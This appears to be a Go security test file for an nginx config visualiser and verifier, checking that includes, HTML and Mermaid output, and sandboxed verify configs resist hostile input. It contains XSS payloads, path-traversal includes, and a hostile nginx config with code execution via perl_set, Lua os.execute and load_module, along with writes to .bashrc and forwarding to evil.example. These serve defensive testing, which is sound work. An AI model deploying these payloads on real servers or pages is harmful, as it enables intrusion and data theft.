package main

// Hostile-input tests: one per attack, then fuzz targets for every way data
// gets in (config files and their includes, the -verify URL file) and every
// place it comes out (the HTML page, the Mermaid file, the scratch configs
// that a real nginx is asked to run, and messages on the terminal).

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"testing"
	"time"
	"unicode/utf8"
)

// ---------- include: reading files the user did not name ----------

func parseAt(t testing.TB, dir string, extra ...string) ([]*Directive, []string, error) {
	t.Helper()
	var warns []string
	ds, err := ParseFile(filepath.Join(dir, "nginx.conf"), &warns, extra...)
	return ds, warns, err
}

func TestIncludeCannotLeaveConfigDir(t *testing.T) {
	outside := writeFiles(t, map[string]string{"secret.conf": "secret_directive leaked;\n"})
	secret := filepath.Join(outside, "secret.conf")
	for name, inc := range map[string]string{
		"absolute path":      secret,
		"absolute glob":      filepath.Join(outside, "*.conf"),
		"glob in directory":  filepath.Join(filepath.Dir(outside), "*", "secret.conf"),
		"parent traversal":   "../" + filepath.Base(outside) + "/secret.conf",
		"traversal via glob": "*/../../" + filepath.Base(outside) + "/secret.conf",
		"system file":        "/etc/hosts",
		"whole file system":  "/*/*/*",
	} {
		t.Run(name, func(t *testing.T) {
			dir := writeFiles(t, map[string]string{
				"nginx.conf":  "before 1;\ninclude " + inc + ";\nafter 2;\n",
				"sub/ok.conf": "fine 1;\n",
			})
			// put the config dir next to the outside dir so ../ can reach it
			ds, warns, err := parseAt(t, dir)
			if err != nil {
				t.Fatal(err)
			}
			if got := names(ds); len(got) != 2 || got[0] != "before" || got[1] != "after" {
				t.Errorf("directives = %v, want only before and after", got)
			}
			if len(warns) != 1 || !(strings.Contains(warns[0], "outside the directory") || strings.Contains(warns[0], "matched no files")) {
				t.Errorf("warnings = %q, want one saying the include was skipped", warns)
			}
		})
	}
}

func TestIncludeDirFlagAllowsANamedDirectory(t *testing.T) {
	outside := writeFiles(t, map[string]string{"shared.conf": "shared 1;\n"})
	dir := writeFiles(t, map[string]string{"nginx.conf": "include " + filepath.Join(outside, "shared.conf") + ";\n"})
	ds, warns, err := parseAt(t, dir, outside)
	if err != nil || len(warns) != 0 || len(ds) != 1 || ds[0].Name != "shared" {
		t.Errorf("with -include-dir: directives %v, warnings %q, err %v", names(ds), warns, err)
	}
}

func TestIncludeSymlinkCannotEscape(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symbolic links need privileges on Windows")
	}
	outside := writeFiles(t, map[string]string{"secret.conf": "secret_directive leaked;\n"})
	dir := writeFiles(t, map[string]string{
		"nginx.conf":          "include conf.d/*.conf;\ninclude linkdir/secret.conf;\n",
		"available/site.conf": "site 1;\n",
		"conf.d/.keep":        "",
	})
	must := func(err error) {
		t.Helper()
		if err != nil {
			t.Fatal(err)
		}
	}
	must(os.Symlink(filepath.Join(outside, "secret.conf"), filepath.Join(dir, "conf.d", "evil.conf")))
	must(os.Symlink(outside, filepath.Join(dir, "linkdir")))
	// A link that stays inside the config directory is the normal
	// sites-enabled arrangement and must keep working.
	must(os.Symlink(filepath.Join(dir, "available", "site.conf"), filepath.Join(dir, "conf.d", "site.conf")))

	ds, warns, err := parseAt(t, dir)
	if err != nil {
		t.Fatal(err)
	}
	if got := names(ds); len(got) != 1 || got[0] != "site" {
		t.Errorf("directives = %v, want only site", got)
	}
	if len(warns) != 2 {
		t.Errorf("warnings = %q, want one per escaping link", warns)
	}
}

func TestIncludeRefusesDevicesAndDirectories(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("no /dev")
	}
	// Even when the user allows /dev, a device is not a config file: reading
	// /dev/zero would otherwise never end.
	dir := writeFiles(t, map[string]string{"nginx.conf": "include /dev/zero;\ninclude sub;\nok 1;\n", "sub/x.conf": "x 1;\n"})
	done := make(chan struct{})
	var ds []*Directive
	var warns []string
	var err error
	go func() { ds, warns, err = parseAt(t, dir, "/dev"); close(done) }()
	select {
	case <-done:
	case <-time.After(10 * time.Second):
		t.Fatal("parsing did not finish: a device was read")
	}
	if err != nil || len(ds) != 1 || ds[0].Name != "ok" || len(warns) != 2 {
		t.Errorf("directives %v, warnings %q, err %v", names(ds), warns, err)
	}
}

func TestIncludeBombs(t *testing.T) {
	cases := map[string]map[string]string{
		// each level includes itself twice: 2^20 parses without a file budget
		"self-include doubling": {"nginx.conf": "include nginx.conf;\ninclude nginx.conf;\n"},
		"mutual":                {"nginx.conf": "include b.conf;\n", "b.conf": "include nginx.conf;\ninclude nginx.conf;\n"},
		"glob of itself":        {"nginx.conf": "include *.conf;\ninclude *.conf;\n", "b.conf": "include *.conf;\n"},
	}
	for name, files := range cases {
		t.Run(name, func(t *testing.T) {
			dir := writeFiles(t, files)
			start := time.Now()
			_, _, err := parseAt(t, dir)
			if err == nil || !(strings.Contains(err.Error(), "include") || strings.Contains(err.Error(), "files")) {
				t.Errorf("err = %v, want an include limit error", err)
			}
			if d := time.Since(start); d > 5*time.Second {
				t.Errorf("took %v", d)
			}
		})
	}
}

// ---------- parser: size, depth, counts ----------

func TestParserLimits(t *testing.T) {
	cases := []struct {
		name string
		src  func() string
		want string
	}{
		{"deep nesting", func() string { return strings.Repeat("a {\n", 200_000) }, "nested more than"},
		{"deep nesting just over", func() string {
			return strings.Repeat("a { ", maxBlockDepth+1) + strings.Repeat("} ", maxBlockDepth+1)
		}, "nested more than"},
		{"too many directives", func() string { return strings.Repeat("a;", maxDirectives+1) }, "directives"},
		{"too many arguments", func() string { return "a" + strings.Repeat(" b", maxArgs+1) + ";" }, "arguments"},
		{"oversized file", func() string { return strings.Repeat("#", maxFileBytes+1) }, "larger than"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			start := time.Now()
			err := parseErr(t, c.src())
			if err == nil || !strings.Contains(err.Error(), c.want) {
				t.Errorf("err = %.200v, want it to mention %q", err, c.want)
			}
			if d := time.Since(start); d > 5*time.Second {
				t.Errorf("took %v", d)
			}
		})
	}
	// The limits must not get in the way of real configs.
	ok := strings.Repeat("a { ", maxBlockDepth) + strings.Repeat("} ", maxBlockDepth)
	if err := parseErr(t, ok); err != nil {
		t.Errorf("nesting exactly at the limit: %v", err)
	}
}

func TestNestingLimitCountsAcrossIncludes(t *testing.T) {
	half := strings.Repeat("a { ", maxBlockDepth/2+1)
	closeHalf := strings.Repeat("} ", maxBlockDepth/2+1)
	dir := writeFiles(t, map[string]string{
		"nginx.conf": half + "include inner.conf; " + closeHalf,
		"inner.conf": half + closeHalf,
	})
	if _, _, err := parseAt(t, dir); err == nil || !strings.Contains(err.Error(), "nested more than") {
		t.Errorf("err = %v, want the nesting limit to apply through an include", err)
	}
}

func TestTotalSizeLimit(t *testing.T) {
	files := map[string]string{"nginx.conf": "include part*.conf;\n"}
	chunk := strings.Repeat("#", maxFileBytes-1)
	for i := 0; i <= maxConfigBytes/maxFileBytes; i++ {
		files["part"+strconv.Itoa(i)+".conf"] = chunk
	}
	dir := writeFiles(t, files)
	if _, _, err := parseAt(t, dir); err == nil || !strings.Contains(err.Error(), "in total") {
		t.Errorf("err = %v, want the total size limit", err)
	}
}

// ---------- messages: terminal escape sequences ----------

var reUnsafeText = regexp.MustCompile(`[\x00-\x08\x0b-\x1f\x7f\x{80}-\x{9f}\x{202a}-\x{202e}\x{2066}-\x{2069}\x{2028}\x{2029}]`)

func TestClean(t *testing.T) {
	cases := []struct{ in, want string }{
		{"plain text é →", "plain text é →"},
		{"esc\x1b[31mred\x1b[0m", "esc?[31mred?[0m"},
		{"title\x1b]0;pwned\x07", "title?]0;pwned?"},
		{"line1\nline2\r\tend", "line1?line2??end"},
		{"csi\u009b31m", "csi?31m"},
		{"rtl\u202eoverride", "rtl?override"},
		{"bad\xff\xfeutf8", "bad\uFFFD\uFFFDutf8"},
		{"nul\x00byte", "nul?byte"},
	}
	for _, c := range cases {
		if got := clean(c.in); got != c.want {
			t.Errorf("clean(%q) = %q, want %q", c.in, got, c.want)
		}
	}
	if got := clean(strings.Repeat("x", 10*maxMessage)); len(got) > maxMessage+len("…") {
		t.Errorf("long message not cut: %d bytes", len(got))
	}
}

func TestErrorsAndWarningsCarryNoControlCharacters(t *testing.T) {
	evil := "\x1b[2J\x1b]0;owned\x07\u202e"
	dir := writeFiles(t, map[string]string{
		"nginx.conf": "include \"missing" + evil + "/*.conf\";\ninclude \"/etc/" + evil + "\";\n",
	})
	_, warns, err := parseAt(t, dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(warns) != 2 {
		t.Fatalf("warnings = %q", warns)
	}
	for _, w := range warns {
		if reUnsafeText.MatchString(w) || strings.Contains(w, "\n") {
			t.Errorf("warning carries control characters: %q", w)
		}
	}
	for _, src := range []string{
		"\"bad" + evil + "name\" arg",    // missing ; at EOF, names the directive
		"server { \"x" + evil + "\" 1 }", // unexpected }
		"\"a" + evil + "\"" + strings.Repeat(" b", maxArgs+1) + ";",
	} {
		err := parseErr(t, src)
		if err == nil {
			t.Fatalf("no error for %q", src)
		}
		if msg := cleanMultiline(err.Error()); reUnsafeText.MatchString(msg) {
			t.Errorf("error as printed carries control characters: %q", msg)
		}
		if reUnsafeText.MatchString(err.Error()) {
			t.Errorf("error carries control characters: %q", err.Error())
		}
	}
}

// ---------- outputs: Mermaid/Markdown and HTML injection ----------

const hostileConf = "server {\n" +
	"    listen 80;\n" +
	"    server_name \"evil\\\"]; click a href \\\"javascript:alert(1)\\\"\" \"```\" \"</script><script>alert(2)</script>\";\n" +
	"    location \"/a```\n\n# heading\n<img src=x onerror=alert(3)>\" { return 200 \"%%{init: {'securityLevel':'loose'}}%%\"; }\n" +
	"    location ~ \"^/b\\\"\\]--><script>alert(4)</script>&lt;\" { proxy_pass \"http://x\\\"]\\nend\\nsubgraph\"; }\n" +
	"    location /c { rewrite \"\x1b[31m\" \"`rm -rf`\" last; }\n" +
	"    include \"nowhere/```\n<script>alert(5)</script>\";\n" +
	"}\n"

// mdProblem reports how a Mermaid/Markdown output could be made to render
// something other than one diagram plus plain text.
func mdProblem(md string) string {
	if !utf8.ValidString(md) {
		return "invalid UTF-8"
	}
	if n := strings.Count(md, "```"); n != 2 {
		return fmt.Sprintf("%d code fence markers, want exactly the 2 around the diagram", n)
	}
	i := strings.Index(md, "```mermaid\n")
	j := strings.LastIndex(md, "\n```\n")
	if i < 0 || j < i {
		return "diagram fence not found"
	}
	for n, l := range strings.Split(md[i+len("```mermaid\n"):j], "\n") {
		if strings.Count(l, `"`)%2 != 0 {
			return fmt.Sprintf("diagram line %d has unbalanced quotes: %s", n+1, l)
		}
		// inside a label only our own <br/> may look like markup
		if strings.Contains(strings.ReplaceAll(l, "<br/>", ""), "<") {
			return fmt.Sprintf("diagram line %d has a raw <: %s", n+1, l)
		}
		if reUnsafeText.MatchString(l) {
			return fmt.Sprintf("diagram line %d has control characters: %q", n+1, l)
		}
	}
	// Outside the diagram, text from the input is either backslash-escaped or
	// inside a code span, so no raw tag can appear.
	rest := md[:i] + md[j:]
	if m := regexp.MustCompile(`(^|[^\\])<[a-zA-Z/!]`).FindString(stripCodeSpans(rest)); m != "" {
		return "raw HTML tag outside the diagram: " + m
	}
	if reUnsafeText.MatchString(strings.ReplaceAll(rest, "\n", "")) {
		return "control characters outside the diagram"
	}
	return ""
}

func stripCodeSpans(s string) string {
	return regexp.MustCompile("`[^`\n]*`").ReplaceAllString(s, "")
}

func hostileBundle(t testing.TB) *Bundle {
	t.Helper()
	dir := writeFiles(t, map[string]string{"nginx.conf": hostileConf})
	var warns []string
	tree, err := ParseFile(filepath.Join(dir, "nginx.conf"), &warns)
	if err != nil {
		t.Fatal(err)
	}
	return &Bundle{
		Title:    "</title><script>alert(0)</script> # *x* ```",
		Warnings: append(warns, "made up\n```\n<script>alert(6)</script>"),
		Hops: []*Hop{
			{Name: "edge`*<b>", File: "a`b/<i>.conf", Addrs: []string{"edge", "`x`<u>"}, Tree: tree},
			{Name: "x", File: "x.conf", Addrs: []string{"x"}, Tree: tree},
		},
	}
}

func TestMermaidInjection(t *testing.T) {
	md := Mermaid(hostileBundle(t))
	if p := mdProblem(md); p != "" {
		t.Errorf("%s\n%s", p, md)
	}
	if !strings.HasPrefix(md, `# \</title\>\<script\>alert\(0\)\</script\> \# \*x\* `) {
		t.Errorf("title not escaped: %q", strings.SplitN(md, "\n", 2)[0])
	}
}

// htmlProblem reports how a rendered page differs from "the viewer, with
// data": anything that would let input run script or load something.
func htmlProblem(html string, b *Bundle) string {
	if n := strings.Count(html, "<script"); n != 1 {
		return fmt.Sprintf("%d <script tags, want 1", n)
	}
	if n := strings.Count(strings.ToLower(html), "</script"); n != 1 {
		return fmt.Sprintf("%d </script tags, want 1", n)
	}
	if strings.Contains(html, "__NGINXVIZ_") {
		return "placeholder left in the page"
	}
	// everything outside the script and the title is the fixed viewer markup
	i, j := strings.Index(html, "<script>"), strings.LastIndex(html, "</script>")
	vi, vj := strings.Index(viewerHTML, "<script>"), strings.LastIndex(viewerHTML, "</script>")
	esc := htmlEscape(clean(b.Title))
	head := strings.ReplaceAll(viewerHTML[:vi], "__NGINXVIZ_TITLE__", esc)
	csp := regexp.MustCompile(`script-src 'sha256-[A-Za-z0-9+/=]{44}'`)
	if got := csp.ReplaceAllString(html[:i], cspInline); got != head {
		return "markup before the script differs from the viewer's"
	}
	if html[j:] != viewerHTML[vj:] {
		return "markup after the script differs from the viewer's"
	}
	if strings.ContainsAny(esc, "<>\"") {
		return "title not escaped"
	}
	// the policy allows this script and no other
	sum := sha256.Sum256([]byte(html[i+len("<script>") : j]))
	if !strings.Contains(html[:i], "script-src 'sha256-"+base64.StdEncoding.EncodeToString(sum[:])+"'") {
		return "Content-Security-Policy does not carry the hash of the page's script"
	}
	if strings.Contains(html[:i], "script-src 'unsafe-inline'") {
		return "Content-Security-Policy still allows any inline script"
	}
	// the data is one line of JSON that reads back
	const marker = "const DATA = "
	k := strings.Index(html, marker)
	if k < 0 {
		return "no DATA"
	}
	line := html[k+len(marker):]
	line = strings.TrimSuffix(line[:strings.IndexByte(line, '\n')], ";")
	if strings.ContainsAny(line, "<>&\u2028\u2029") {
		return "data contains a character that is unsafe inside a script"
	}
	var back Bundle
	if err := json.Unmarshal([]byte(line), &back); err != nil {
		return "data is not valid JSON: " + err.Error()
	}
	if len(back.Hops) != len(b.Hops) {
		return "data lost hops"
	}
	return ""
}

func TestHTMLInjection(t *testing.T) {
	b := hostileBundle(t)
	html, err := renderHTML(b)
	if err != nil {
		t.Fatal(err)
	}
	if p := htmlProblem(html, b); p != "" {
		t.Error(p)
	}
}

func TestViewerHasNoHTMLSinks(t *testing.T) {
	// Config text may only reach the page as text nodes and attribute values
	// set by the page's own code. None of these may appear in the viewer.
	i, j := strings.Index(viewerHTML, "<script>"), strings.LastIndex(viewerHTML, "</script>")
	js := viewerHTML[i:j]
	for _, sink := range []string{"innerHTML", "outerHTML", "insertAdjacentHTML", "document.write", "eval(", "new Function",
		"setAttribute('on", `setAttribute("on`, ".srcdoc", "javascript:", "DOMParser", "createContextualFragment", "import(", "= {}", "({}"} {
		if strings.Contains(js, sink) {
			t.Errorf("viewer script contains %q", sink)
		}
	}
	if regexp.MustCompile(`(?i)<[a-z][^>]*\son[a-z]+\s*=`).MatchString(viewerHTML[:i]) {
		t.Error("viewer markup has an inline event handler, which the script hash policy would block")
	}
}

// ---------- verify: what a real nginx is asked to run ----------

var generatedDirectives = map[string]bool{"daemon": true, "master_process": true, "pid": true, "error_log": true, "events": true,
	"worker_connections": true, "access_log": true, "ssl_certificate": true, "ssl_certificate_key": true,
	"server_names_hash_bucket_size": true, "map_hash_bucket_size": true,
	"client_body_temp_path": true, "proxy_temp_path": true, "fastcgi_temp_path": true, "uwsgi_temp_path": true, "scgi_temp_path": true}

var reLocal = regexp.MustCompile(`^127\.0\.0\.1:\d{1,5}$`)
var reLocalURL = regexp.MustCompile(`^[a-z]+://127\.0\.0\.1:\d{1,5}($|[/?])`)

// scratchProblem checks a scratch config against what verify promises: only
// directives from the allow-list (or the fixed ones verify adds itself),
// every listener and every backend on 127.0.0.1, every path verify adds
// inside the scratch directory.
func scratchProblem(s *scratch, h *shop, conf string) string {
	var warns []string
	tree, err := parseBytes([]byte(conf), h.dir, &warns)
	if err != nil {
		return "scratch config does not parse: " + err.Error()
	}
	if len(warns) > 0 {
		return "scratch config has includes: " + strings.Join(warns, "; ")
	}
	var walk func(ds []*Directive, ctx string, own bool) string
	walk = func(ds []*Directive, ctx string, own bool) string {
		for _, d := range ds {
			arg0 := ""
			if len(d.Args) > 0 {
				arg0 = d.Args[0]
			}
			gen := generatedDirectives[d.Name]
			switch {
			case d.Name == "include":
				return "include in a scratch config"
			case !verifyAllowed[d.Name] && !s.allow[d.Name] && !gen:
				return "directive not on the allow-list: " + d.Name
			case d.Name == "listen":
				if !reLocal.MatchString(arg0) {
					return "listen outside 127.0.0.1: " + arg0
				}
			case d.Name == "server" && ctx == "upstream":
				if !reLocal.MatchString(arg0) {
					return "upstream server outside 127.0.0.1: " + arg0
				}
			case d.Name == "proxy_pass":
				if m := passRe.FindStringSubmatch(arg0); m != nil {
					if _, up := h.ups[strings.ToLower(m[2])]; up {
						break
					}
				}
				if !reLocalURL.MatchString(arg0) {
					return "proxy_pass outside 127.0.0.1: " + arg0
				}
			case d.Name == "grpc_pass":
				if !reLocalURL.MatchString(arg0) {
					return "grpc_pass outside 127.0.0.1: " + arg0
				}
			case strings.HasSuffix(d.Name, "_pass"):
				if !reLocal.MatchString(arg0) {
					return d.Name + " outside 127.0.0.1: " + arg0
				}
			case d.Name == "access_log":
				if arg0 != "off" || len(d.Args) != 1 {
					return "access_log is not off"
				}
			case d.Name == "pid" || d.Name == "error_log" || strings.HasSuffix(d.Name, "_temp_path"):
				if !inside(h.dir, arg0) {
					return d.Name + " outside the scratch directory: " + arg0
				}
			case d.Name == "ssl_certificate" || d.Name == "ssl_certificate_key":
				if arg0 != s.certFile && arg0 != s.keyFile {
					return d.Name + " is not the scratch certificate"
				}
			}
			if d.IsBlk && !dataBlocks[d.Name] {
				if p := walk(d.Block, d.Name, own); p != "" {
					return p
				}
			}
		}
		return ""
	}
	return walk(tree, "main", false)
}

const hostileVerifyConf = `
load_module /tmp/evil.so;
user root;
env SECRET;
worker_rlimit_core 10g;
working_directory /tmp/cores;
google_perftools_profiles /tmp/prof;
error_log syslog:server=evil.example debug;
pcre_jit on;
worker_processes 100000;
events { worker_connections 100000000; use poll; }
stream { server { listen 12345; proxy_pass evil.example:25; } }
mail { server_name x; }
http {
    perl_modules /tmp/perl; perl_require evil.pm; perl_set $x 'sub { system("id") }';
    js_import /tmp/evil.js; js_set $y evil.run;
    lua_package_path "/tmp/?.lua";
    resolver 8.8.8.8;
    access_log syslog:server=evil.example;
    access_log /tmp/owned.log;
    log_format x '$request';
    client_body_temp_path /tmp/owned-body;
    proxy_temp_path /tmp/owned-proxy;
    proxy_cache_path /tmp/owned-cache keys_zone=c:10m;
    fastcgi_cache_path /tmp/owned-fcgi keys_zone=f:10m;
    limit_req_zone $binary_remote_addr zone=z:100000m rate=1r/s;
    server_names_hash_max_size 2000000000;
    ssl_engine evil; ssl_password_file /etc/passwd;
    geoip_country /tmp/GeoIP.dat;
    upstream out { server evil.example:80; server unix:/tmp/evil.sock; server [2001:db8::1]:80 resolve; zone z 100000m; }
    server {
        listen 0.0.0.0:80; listen [::]:80; listen 8443 ssl; listen unix:/tmp/owned.sock;
        ssl_certificate /etc/ssl/private/real.pem; ssl_certificate_key /etc/ssl/private/real.key;
        ssl_client_certificate /tmp/ca.pem; ssl_trusted_certificate /tmp/ca.pem;
        location /store  { proxy_pass http://evil.example; proxy_store /home/user/.bashrc; proxy_store_access user:rw; }
        location /dav    { root /; dav_methods PUT DELETE MKCOL COPY MOVE; create_full_put_path on; client_body_in_file_only on; }
        location /a      { proxy_pass HTTP://evil.example; }
        location /b      { proxy_pass http://evil.example:80@127.0.0.1/; }
        location /c      { proxy_pass https://[2001:db8::1]:443/x; }
        location /d      { proxy_pass http://$host$request_uri; }
        location /e      { proxy_pass /nonsense; }
        location /f      { proxy_pass http://OUT; }
        location /g      { proxy_pass "http://evil.example;\n}\nload_module /tmp/evil.so;"; }
        location /h      { fastcgi_pass evil.example:9000; fastcgi_store /tmp/owned; }
        location /i      { uwsgi_pass evil.example:1; scgi_pass evil.example:2; memcached_pass evil.example:3; grpc_pass grpc://evil.example:4; }
        location /j      { xslt_stylesheet /tmp/evil.xslt; ssi on; image_filter resize 1 1; }
        location /k      { proxy_bind 10.0.0.1; proxy_ssl_certificate /tmp/c.pem; mirror /m; auth_request /m; }
        location /l      { if ($arg_x) { proxy_pass http://evil.example; } limit_except GET { proxy_pass http://evil.example; } }
        location /m      { include a b; error_log /tmp/owned-error.log; access_log /tmp/owned-access.log; }
    }
}
`

func TestScratchConfigRunsOnlyAllowedDirectivesLocally(t *testing.T) {
	s := newScratch(t, oneHop(t, hostileVerifyConf))
	h := s.hops[0]
	conf, err := s.buildConf(h)
	if err != nil {
		t.Fatal(err)
	}
	if p := scratchProblem(s, h, conf); p != "" {
		t.Errorf("%s\n%s", p, conf)
	}
	// The only trace of the original backends is the Host header nginx would
	// have sent them, which is text in a request to a local stub.
	for _, line := range strings.Split(conf, "\n") {
		if strings.HasPrefix(strings.TrimSpace(line), "proxy_set_header Host ") {
			continue
		}
		for _, leak := range []string{"evil", "/tmp/", "owned", "syslog", "8.8.8.8", "2001:db8", "0.0.0.0", "/etc/", "/home/", "100000", "perl", "js_", "lua", "dav_", "_store", "resolver", "load_module"} {
			if strings.Contains(line, leak) {
				t.Errorf("scratch config still contains %q: %s", leak, line)
			}
		}
	}
	for _, line := range strings.Split(conf, "\n") {
		if l := strings.TrimSpace(line); strings.HasPrefix(l, "proxy_set_header Host ") && !regexp.MustCompile(`^proxy_set_header Host [A-Za-z0-9.\[\]:_-]+;$`).MatchString(l) {
			t.Errorf("Host header is not a plain host: %s", l)
		}
	}
	// What was left out is reported, by name.
	note := s.droppedNote()
	for _, n := range []string{"load_module", "perl_set", "js_import", "proxy_store", "dav_methods", "resolver", "limit_req_zone", "xslt_stylesheet", "env"} {
		if !strings.Contains(note, n) {
			t.Errorf("dropped-directive note does not name %s: %s", n, note)
		}
	}
	// The upstream name still resolves, to local stubs.
	if !strings.Contains(conf, "proxy_pass http://OUT;") {
		t.Errorf("proxy_pass to a named upstream was rewritten")
	}
}

func TestVerifyAllowAddsOneDirective(t *testing.T) {
	b := oneHop(t, "server { listen 80; sub_filter a b; ssi on; location / { return 200; } }")
	s := newScratch(t, b)
	conf, _ := s.buildConf(s.hops[0])
	if strings.Contains(conf, "sub_filter") || strings.Contains(conf, "ssi") {
		t.Errorf("unlisted directives copied by default:\n%s", conf)
	}
	s = newScratch(t, b)
	s.allow["sub_filter"] = true
	conf, _ = s.buildConf(s.hops[0])
	if !strings.Contains(conf, "sub_filter a b;") || strings.Contains(conf, "ssi") {
		t.Errorf("-verify-allow sub_filter should copy exactly that directive:\n%s", conf)
	}
	if p := scratchProblem(s, s.hops[0], conf); p != "" {
		t.Error(p)
	}
}

func TestVerifyRefusesLuaInAnyForm(t *testing.T) {
	for _, src := range []string{
		"server { location / { content_by_lua_block { os.execute('id') } } }",
		"server { location / { content_by_lua 'os.execute(\"id\")'; } }",
		"server { location / { access_by_lua_file /tmp/x.lua; } }",
		"http { init_by_lua_block { os.execute('id') } server { listen 80; } }",
	} {
		s := newScratch(t, oneHop(t, src))
		if _, err := s.buildConf(s.hops[0]); err == nil || !strings.Contains(err.Error(), "Lua") {
			t.Errorf("%s: err = %v, want a refusal", src, err)
		}
	}
}

func TestVerifyListenerLimits(t *testing.T) {
	var sb strings.Builder
	for i := 0; i <= maxListenPorts; i++ {
		fmt.Fprintf(&sb, "server { listen %d; }\n", 1000+i)
	}
	b := oneHop(t, sb.String())
	s := &scratch{b: b, dir: t.TempDir(), stubs: map[string]int{}, notes: map[string]bool{}}
	if err := s.plan(func() (int, error) { return 1, nil }); err == nil || !strings.Contains(err.Error(), "listen ports") {
		t.Errorf("err = %v, want the listen port limit", err)
	}

	sb.Reset()
	sb.WriteString("server { listen 80;\n")
	for i := 0; i <= maxStubs; i++ {
		fmt.Fprintf(&sb, "location /%d { proxy_pass http://backend%d.example; }\n", i, i)
	}
	sb.WriteString("}\n")
	s = newScratch(t, oneHop(t, sb.String()))
	if _, err := s.buildConf(s.hops[0]); err == nil || !strings.Contains(err.Error(), "backend addresses") {
		t.Errorf("err = %v, want the stub limit", err)
	}
	// ports that are not ports
	for _, src := range []string{"listen 0;", "listen 70000;", "listen -1;", "listen 127.0.0.1:99999;"} {
		if _, ok := listenPortOf(parseStr(t, src)[0]); ok {
			t.Errorf("%s accepted as a TCP port", src)
		}
	}
}

func TestScratchCertificateIsVerifiedNotSkipped(t *testing.T) {
	mk := func(hosts ...string) *scratch {
		s := &scratch{dir: t.TempDir()}
		if err := s.makeCert(hosts); err != nil {
			t.Fatal(err)
		}
		return s
	}
	a := mk("example.com", "www.example.com", "10.1.2.3", "bad host\x1b[31m", "evil.example\x00.example.com", strings.Repeat("a", 300)+".example")
	other := mk("example.com")
	handshake := func(server, client *scratch, sni string) error {
		c, sv := net.Pipe()
		defer c.Close()
		defer sv.Close()
		go func() { tls.Server(sv, server.tlsCfg).Handshake() }()
		conn := tls.Client(c, &tls.Config{RootCAs: client.roots, ServerName: sni, MinVersion: tls.VersionTLS12})
		conn.SetDeadline(time.Now().Add(5 * time.Second))
		return conn.Handshake()
	}
	for _, name := range []string{"example.com", "www.example.com", "10.1.2.3", scratchName} {
		if err := handshake(a, a, name); err != nil {
			t.Errorf("own certificate rejected for %s: %v", name, err)
		}
	}
	if err := handshake(a, a, "not-on-the-cert.example"); err == nil {
		t.Error("certificate accepted for a name it does not carry")
	}
	if err := handshake(other, a, "example.com"); err == nil {
		t.Error("a different certificate for the same name was accepted: verification is off")
	}
	if len(a.certNames) != 4 {
		t.Errorf("certificate names = %v, want the 3 valid hosts plus %s", a.certNames, scratchName)
	}
	many := make([]string, 0, 3*maxCertNames)
	for i := 0; i < 3*maxCertNames; i++ {
		many = append(many, fmt.Sprintf("h%d.example", i))
	}
	if n := len(mk(many...).certNames); n != maxCertNames {
		t.Errorf("%d names on the certificate, want the cap of %d", n, maxCertNames)
	}
	if st, err := os.Stat(a.keyFile); err != nil || (runtime.GOOS != "windows" && st.Mode().Perm() != 0o600) {
		t.Errorf("scratch key file mode: %v %v", st, err)
	}
}

func TestURLFileLimits(t *testing.T) {
	if _, err := parseCases([]byte(strings.Repeat("http://example.com/\n", maxCases+1)), "urls"); err == nil || !strings.Contains(err.Error(), "requests") {
		t.Errorf("too many requests: err = %v", err)
	}
	if _, err := parseCases([]byte("http://example.com/"+strings.Repeat("a", maxCaseLine)), "urls"); err == nil || !strings.Contains(err.Error(), "longer than") {
		t.Errorf("long line: err = %v", err)
	}
	dir := writeFiles(t, map[string]string{"big.txt": strings.Repeat("#", maxCasesBytes+1)})
	if _, err := readCases(filepath.Join(dir, "big.txt")); err == nil || !strings.Contains(err.Error(), "larger than") {
		t.Errorf("big file: err = %v", err)
	}
	_, err := parseCases([]byte("GET http://x/ \x1b[31mextra\x07"), "urls")
	if err == nil || reUnsafeText.MatchString(err.Error()) {
		t.Errorf("error for a bad line must not carry control characters: %q", err)
	}
}

// ---------- fuzzing ----------

var fuzzSeeds = []string{
	"worker_processes auto;\nevents { worker_connections 1024; }\n",
	`location ~* "\.(png|jpe?g)$" { expires 30d; }`,
	"set $a 'it\\'s'; set $b \"x\\\\\";",
	"content_by_lua_block { local t = {} }",
	"map $a $b { default 0; \"~*bot\" 1; }",
	"set $c pre${host}post;",
	"a\\;b c\\ d;",
	"\"}\" \"{\" \";\";",
	"server { listen 80 }",
	"include inc/*.conf; include /etc/hosts; include ../x; include inc/a.conf;",
	"upstream u { server 10.0.0.1:80; server unix:/x.sock backup; } server { listen 443 ssl; location / { proxy_pass http://u; } }",
	"server { listen [::]:8080 default_server; location @n { fastcgi_pass unix:/run/php.sock; } location / { try_files $uri @n; } }",
	hostileConf,
	hostileVerifyConf,
}

// addSeeds seeds a fuzz target with the built-in cases, the example configs,
// and every file in the directory named by NGINXVIZ_FUZZ_SEEDS (point it at
// real configs for a long run).
func addSeeds(f *testing.F) {
	for _, s := range fuzzSeeds {
		f.Add([]byte(s))
	}
	paths, _ := filepath.Glob("examples/*/*.conf")
	more, _ := filepath.Glob("examples/*/*/*.conf")
	paths = append(paths, more...)
	if dir := os.Getenv("NGINXVIZ_FUZZ_SEEDS"); dir != "" {
		filepath.WalkDir(dir, func(p string, d os.DirEntry, err error) error {
			if err == nil && d.Type().IsRegular() {
				paths = append(paths, p)
			}
			return nil
		})
	}
	for _, p := range paths {
		if data, err := os.ReadFile(p); err == nil && len(data) <= 1<<20 {
			f.Add(data)
		}
	}
}

// fuzzRoot is a config directory with files a fuzzed config may include, next
// to a file it must never be able to reach.
func fuzzRoot(f *testing.F) string {
	base := f.TempDir()
	root := filepath.Join(base, "conf")
	for name, content := range map[string]string{
		"conf/inc/a.conf": "included_a 1;\nlocation /inc { return 204; }\n",
		"conf/inc/b.conf": "included_b { x y; }\n",
		"conf/x":          "included_x;\n",
		"secret.conf":     "nginxviz_secret_marker leaked;\n",
	} {
		p := filepath.Join(base, filepath.FromSlash(name))
		os.MkdirAll(filepath.Dir(p), 0o755)
		if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
			f.Fatal(err)
		}
	}
	return root
}

func hasDirective(ds []*Directive, name string) bool {
	for _, d := range ds {
		if d.Name == name || hasDirective(d.Block, name) {
			return true
		}
	}
	return false
}

